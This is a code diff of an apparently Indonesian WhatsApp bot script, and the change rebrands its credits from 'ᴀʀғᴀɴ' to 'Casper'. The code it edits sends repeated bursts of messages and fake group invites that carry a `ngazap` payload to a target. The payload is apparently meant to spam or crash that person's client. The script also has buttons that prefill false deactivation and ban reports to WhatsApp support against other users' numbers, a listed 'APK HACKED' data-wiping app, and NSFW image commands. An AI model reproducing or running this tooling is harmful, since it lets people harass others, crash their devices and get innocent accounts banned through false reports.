-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1710,7 +1881,7 @@ templateButtons: [
  })
  await sleep(20)
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1721,7 +1892,7 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1732,7 +1903,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1743,7 +1914,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1754,7 +1925,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1765,7 +1936,7 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1777,7 +1948,7 @@ templateButtons: [
  })
  await sleep(20)
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1788,7 +1959,7 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1799,7 +1970,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1810,7 +1981,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1821,7 +1992,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1832,7 +2003,7 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1843,7 +2014,7 @@ templateButtons: [
 ], 
  })
  haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1854,7 +2025,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1865,7 +2036,7 @@ templateButtons: [
 ], 
  })
 haikal.sendMessage(Pe, { 
-text: 'POWERED BY HAIKAlN /> ZERO TO HERO', 
+text: `© Casper${ngazap(prefix)}`, 
 templateButtons: [
 { callButton: { displayText: `Number Phone Owner`, phoneNumber: `owner`}},
 { urlButton: { displayText: `OWNER`, url: 'https://wa.me/62895403595055'}},
@@ -1897,8 +2068,8 @@ var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject(
 "groupInviteMessage": {
 "groupJid": "85296556573-1328272333@g.us",
 "inviteCode": "wFHwtOxGQN8OwK2x",
-"inviteExpiration": `MY NAME ᴀʀғᴀɴ${ngazap(prefix)}`,
-"groupName": `MY NAME ᴀʀғᴀɴ${ngazap(prefix)}`,
+"inviteExpiration": `MY NAME Casper${ngazap(prefix)}`,
+"groupName": `MY NAME Casper${ngazap(prefix)}`,
 "caption": `${ngazap(prefix)}`,
 "jpegThumbnail": messa.imageMessage,
 }
@@ -1954,7 +2125,7 @@ if (!AntiNsfww) return m.reply(mess.nsfw)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 const bugcrot = {
 image: {url:waifudd.data.url},
-caption: `© ᴀʀғᴀɴ${buttonkal}`,
+caption: `© Casper${buttonkal}`,
 } 
 haikal.sendMessage(m.chat, bugcrot, { quoted:m}).catch(err => {
  return('Error!')
@@ -1967,7 +2138,7 @@ m.reply(mess.wait)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
  const bugahay = {
 image: {url:waifudd.data.url},
-caption: `© ᴀʀғᴀɴ${buttonkal}`,
+caption: `© Casper${buttonkal}`,
 } 
 haikal.sendMessage(m.chat, bugahay, { quoted:m}).catch(err => {
  return('Error!')
@@ -2959,7 +3130,7 @@ respon = `
 
 Nama : Haikal
 
-Support : ᴀʀғᴀɴ
+Support : Casper
 
 Umur : 13th
 
@@ -4749,7 +4920,7 @@ break
 case 'listjualan':
 touchmebree = [
 {
-title: `©️ ᴀʀғᴀɴ`,
+title: `©️ Casper`,
 rows: [
  {title: `APK HACKED `, rowId: `${prefix}apkhack`, description: `Aplikasi Penghapus Data Memory`},
   {title: `APK BEALAJAR `, rowId: `${prefix}belajarkita`, description: `Aplikasi Belajar Bersama`},  
@@ -4820,7 +4991,7 @@ case 'listwibu':
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 touchmebree = [
 {
-title: `©️ ᴀʀғᴀɴ`,
+title: `©️ Casper`,
 rows: [
 {title: `WIBU 1`, rowId: `${prefix}kill`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `},
@@ -4886,7 +5057,7 @@ document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
 "fileName": `BANNED WHATSAPP`,
 caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
 Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
-footer: ` ᴀʀғᴀɴ`,
+footer: ` Casper`,
 mentionedJid: m.mentionedJid,
 templateButtons: [{ urlButton: {displayText: `BANNED`, url: 'mailto:support@whatsapp.com?Body=Hello,%20please%20deactivate%20this%20number,%20because%20I%20have%20lost%20my%20cellphone%20and%20someone%20is%20using%20my%20number,%20please%20deactivate%20my%20number:%2B+62xxxxxx'}}],
 headerType: 1
@@ -4902,7 +5073,7 @@ document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
 "fileName": `UNBANED WHATSAPP`,
 caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
 Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
-footer: ` ᴀʀғᴀɴ`,
+footer: ` Casper`,
 mentionedJid: m.mentionedJid,
 templateButtons: [{ urlButton: {displayText: `UNBANED`, url: 'mailto:support@whatsapp.com?Body=Please%20reactivate%20my%20number%20because%20I%20didnt%20violate%20any%20WhatsApp%20rules,%20suddenly%20my%20number%20was%20banned,%20please%20reactivate%20this%20number:%2B+62xxxxxxx%20because%20I%20didnt%20do%20anything%20wrong,%20suddenly%20my%20number%20was%20banned%20when%20I%20entered%20the%20group%20so%20I%20ask%20the%20respectable%20WhatsApp%20party,%20please%20reactivate%20my%20number,%20thank%20you'}}],
 headerType: 1
@@ -4918,7 +5089,7 @@ document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
 "fileName": `UNBANED WHATSAPP`,
 caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
 Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
-footer: ` ᴀʀғᴀɴ`,
+footer: ` Casper`,
 mentionedJid: m.mentionedJid,
 templateButtons: [{ urlButton: {displayText: `RESET CODE`, url: 'mailto:support@whatsapp.com?Body=Please%20research%20the%20OTP%20code%20for%20this%20number%20because%20someone%20else%20accidentally%20logged%20in%20with%20my%20number%20and%20I%20had%20to%20wait%208%20hours,%20please%20research%20again%20at%20this%20number:%2B+62xxxxx'}}],
 headerType: 1
@@ -4931,7 +5102,7 @@ case 'listban':
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 touchmebree = [
 {
-title: `©️ ᴀʀғᴀɴ`,
+title: `©️ Casper`,
 rows: [
 {title: `BANNED`, rowId: `${prefix}banned`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `},
@@ -5620,7 +5791,7 @@ case 'listlogo':
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 touchmebree = [
 {
-title: `©️ ᴀʀғᴀɴ`,
+title: `©️ Casper`,
 rows: [
 {title: `LOGO 1`, rowId: `${prefix}hw1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `},
@@ -5795,7 +5966,7 @@ case 'listasupan':
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 touchmebree = [
 {
-title: `©️ ᴀʀғᴀɴ`,
+title: `©️ Casper`,
 rows: [
 {title: `ASUPAN 1`, rowId: `${prefix}asupan1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `},
@@ -5833,7 +6004,7 @@ case 'listcecan':
 if (isBan) return reply(`Lah Lu Kan Di Ban`)
 touchmebree = [
 {
-title: `©️ ᴀʀғᴀɴ`,
+title: `©️ Casper`,
 rows: [
 {title: `CECAN 1`, rowId: `${prefix}cecan1`, description: ` © Hay Kak ${pushname} 👋 Selamat ${salam}
  `},
